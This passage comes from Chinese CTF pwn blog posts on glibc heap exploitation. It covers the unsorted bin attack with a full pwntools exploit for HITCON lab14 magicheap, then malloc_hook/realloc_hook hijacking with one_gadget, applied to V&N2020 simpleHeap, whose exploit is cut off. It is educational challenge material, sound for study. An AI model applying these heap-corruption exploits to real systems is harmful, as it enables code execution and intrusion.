class="line">Now, we allocate first normal chunk on the heap at: 0x1fce010</span><br><span class="line">And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()</span><br><span class="line"></span><br><span class="line">We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78</span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508</span><br><span class="line"></span><br><span class="line">Let&#39;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:</span><br><span class="line">0x7ffe0d232518: 0x7f1c705ffb78</span><br></pre></td></tr></table></figure><p>这里我们可以使用一个图来描述一下具体发生的流程以及背后的原理。</p><p><img src="img/unsorted_bin_attack_order.png" alt="img"></p><p><strong>初始状态时</strong></p><p>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。</p><p><strong>执行 free(p)</strong></p><p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p><p><strong>修改 p[1]</strong></p><p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><strong>申请 400 大小的 chunk</strong></p><p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">       only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">       runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">       exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">       no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* 显然，bck被修改，并不符合这里的要求*/</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">        victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">    unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li></ul><blockquote><p>上面四步就是遍历寻找 unsorted bin 中是否有符合申请大小的 chunk ，上面这个是 bin 中 chunk 大小大于申请 size + MINSIZE 的情况。</p><p>前面两个是变量的定义：victim 当前堆、bck 后一块堆；</p><p>后面是遍历合适 chunk 之后 unlink 取出操作：</p><ul><li>unsorted_chunks(av) 前一块堆的 bk 指针指向后一块堆块 bck ；</li><li>后一块堆块 bck fd 指针指向前一块堆块 unsorted_chunks(av) ；</li></ul><p><strong>四步中 victim fd 一直没有被使用过；bk 指针影响 bck、bck-&gt;fd 的值。如果我们能够控制 victim 的 bk 指针就能将 unsorted_chunks(av) 这个地址值写到任意地址（原因看面 unlink 的第四步）</strong>，举个例子：</p><p>unsorted_chunks(av) 的地址值为：0x61616161 ，想将其写入到 target_addr 。控制 victim-&gt;bk 为：target_addr - 16 ，当进行 unlink 时会执行：bck-&gt;fd = *(target_addr -16+16) = unsorted_chunks(av); ，成功将 0x61616161 写入到 target_addr</p></blockquote><p><strong>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p><p>即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78</span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508</span><br><span class="line"></span><br><span class="line">Let&#39;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:</span><br><span class="line">0x7ffe0d232518: 0x7f1c705ffb78</span><br></pre></td></tr></table></figure><p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。<strong>而且，需要注意的是，</strong></p><p>这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说</p><ul><li><strong>我们通过修改循环的次数来使得程序可以执行多次循环。（修改任意地址内容，内容不可控）</strong></li><li><strong>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</strong></li></ul><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14">题目链接</a></p><p>这里我们修改一下源程序中的 l33t 函数，以便于可以正常运行。（buu 上的题目替换为了 /bin/sh ）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">l33t</span><span class="params">()</span> </span>&#123; system(<span class="string">&quot;cat ./flag&quot;</span>); &#125;</span><br></pre></td></tr></table></figure><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  hitcontraining_lab14 git:(master) file magicheap</span><br><span class="line">magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped</span><br><span class="line">➜  hitcontraining_lab14 git:(master) checksec magicheap</span><br><span class="line">[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看出，该程序是一个动态链接的 64 程序，主要开启了 NX 保护与 Canary 保护。</p><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>程序大概就是自己写的堆管理器，主要有以下功能</p><ol><li>创建堆。根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。</li><li>编辑堆。根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，这里其实就出现了任意长度堆溢出的漏洞。</li><li>删除堆。根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。</li></ol><p>同时，我们看到，当我们控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 了。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>很显然， 我们直接利用 unsorted bin attack 即可。控制 bk 指针向目标地址写入一个大数字。</p><ol><li>释放一个堆块到 unsorted bin 中。</li><li>利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &amp;magic-16。</li><li>触发漏洞即可（申请）。</li></ol><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25014</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x6020A0</span>-<span class="number">0x10</span>)<span class="comment">#p64(0x06020C0-0x10)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;skye&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x1305</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>realloc学习</title>
      <link href="archives/dd6af626/"/>
      <url>archives/dd6af626/</url>
      
        <content type="html"><![CDATA[<h1 id="通过-realloc-hook-调整栈帧使-onegadget-生效"><a href="#通过-realloc-hook-调整栈帧使-onegadget-生效" class="headerlink" title="通过 realloc_hook 调整栈帧使 onegadget 生效"></a>通过 realloc_hook 调整栈帧使 onegadget 生效</h1><p>在某些堆的题目当中，由于限制只能使用 house of spirit 等方法劫持 malloc_hook ，这种情况一般是往 malloc_hook 写入 onegadget ，再次申请堆来 getshell 。</p><p>由于栈帧情况不满足，查询到的所有 onegadget 可能都打不通，这时就可以考虑下用 malloc_hook 和 realloc_hook 结合。先通过 realloc 调整栈帧，然后在运行 onegadget 。</p><h2 id="了解-realloc"><a href="#了解-realloc" class="headerlink" title="了解 realloc"></a>了解 realloc</h2><p>realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook 函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">realloc</span><span class="params">(<span class="keyword">signed</span> __int64 a1, <span class="keyword">unsigned</span> __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ( _realloc_hook )</span><br><span class="line"><span class="keyword">return</span> _realloc_hook(a1, a2, retaddr);</span><br><span class="line">    ……</span><br></pre></td></tr></table></figure><p>看看 realloc 的汇编代码：（可以把 libc 拖到 ida 中看，也可以泄露地址后 gdb 调试查看 <code>x /20i [addr]</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑o</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#39;__libc_realloc&#39;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8; 跳转执行 realloc_hook</span><br><span class="line">.text:00000000000846E7                 test    rsi, rsi</span><br><span class="line">.text:00000000000846EA                 jnz     short loc_846F5</span><br><span class="line">.text:00000000000846EC                 test    rdi, rdi</span><br><span class="line">.text:00000000000846EF                 jnz     loc_84960</span><br></pre></td></tr></table></figure><p>函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp 的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。除了可以控制 push 数量，还能通过偏移得到其他的 <code>push xxx</code> 。</p><h2 id="malloc-hook-与-realloc-hook-配合"><a href="#malloc-hook-与-realloc-hook-配合" class="headerlink" title="malloc_hook 与 realloc_hook 配合"></a>malloc_hook 与 realloc_hook 配合</h2><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</span><br></pre></td></tr></table></figure><p>这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。</p><p>realloc 这个偏移做题还是逐个试感觉快一点，因为设想是<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code></strong> ，但实际上有少部分位置可能被其他东西写入改变了原来的值。自行调试体会一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 6个push</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20gx <span class="variable">$rsp</span></span></span><br><span class="line">0x7fffffffdcb8:0x00007ffff7a9195f0x00007fffffffdd20</span><br><span class="line">0x7fffffffdcc8:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdcd8:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdce8:0x00007ffff7a43ea00x00007fffffffde40</span><br><span class="line">0x7fffffffdcf8:0x00000000000000000x00007fffffffdd40</span><br><span class="line">0x7fffffffdd08:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdd18:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdd28:0x0000555555554b710x00005555555548e0</span><br><span class="line">0x7fffffffdd38:0x00000010000000060x00007fffffffdd60</span><br><span class="line">0x7fffffffdd48:0x0000555555554f860x00007fffffffde40</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5个push</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20gx <span class="variable">$rsp</span></span></span><br><span class="line">0x7fffffffdcc0:0x00007ffff7a9195f0x00005555555548e0</span><br><span class="line">0x7fffffffdcd0:0x00007fffffffde400x0000000000000000</span><br><span class="line">0x7fffffffdce0:0x00000000000000000x00007ffff7a43ea0</span><br><span class="line">0x7fffffffdcf0:0x00007fffffffde400x0000555555554a23</span><br><span class="line">0x7fffffffdd00:0x00000000000000000x00007fffffffdd40</span><br><span class="line">0x7fffffffdd10:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdd20:0x00000000000000000x0000555555554b71</span><br><span class="line">0x7fffffffdd30:0x00005555555548e00x0000001000000006</span><br><span class="line">0x7fffffffdd40:0x00007fffffffdd600x0000555555554f86</span><br><span class="line">0x7fffffffdd50:0x00007fffffffde400x0000000100000000</span><br></pre></td></tr></table></figure><p>原理上是：**少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code>**，但实际部分位置的值会变，所以逐个试，速度可能比计算快。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="V-amp-N2020-公开赛-simpleHeap"><a href="#V-amp-N2020-公开赛-simpleHeap" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap"></a>[V&amp;N2020 公开赛]simpleHeap</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>一个基本的堆管理器，有增删查改功能。各项功能都是基于下标序号定位操作，上限为10个堆，大小为大于 0 、小于等于 0x6f 。没有结构体，基于两个列表存储堆信息。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>在修改函数里，调用函数 sub_C39 完成对堆信息的修改。传入的参数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_C39((__int64)chunk_ptr_list[v1], chunk_size_list[v1])</span><br></pre></td></tr></table></figure><p>在处理边界问题时，错误使用判断条件，导致溢出 1 字节，正确应该<code>if(i&gt;=size)</code>，具体逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_C39</span><span class="params">(__int64 ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; size )                             <span class="comment">// off by one</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + ptr), <span class="number">1uLL</span>) )    <span class="comment">// 输出错误的异常处理</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + ptr) == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = i + ptr;</span><br><span class="line">      *(_BYTE *)result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p><p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p><p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p><hr><p>溢出修改 chunk size 造成 chunk extend ，chunk0 用于溢出 chunk1 ，chunk2 用于读取 unsorted bin fd 指针，chunk3 防止 fake chunk 与 topchunk 合并。溢出 size 是经过计算符合 house of spirit 要求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;y&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;yyds&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>泄露 libc 地址后，将 bin 中剩余内存申请出来，该指针与 chunk2 指向相同地址，任选其一释放，再用另外一个修改 fastbin fd 指针：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure><p>正常来说将 malloc_hook 劫持为 onegadget 即可，但是测试发现这条题目的栈环境不满足全部 onegadget 条件，这就需要调整阵结构，使 onegadget 生效。<strong>需要配合使用 realloc_hook 和 malloc_hook。</strong></p><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 。然后通过多次尝试确定偏移为 12 。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span 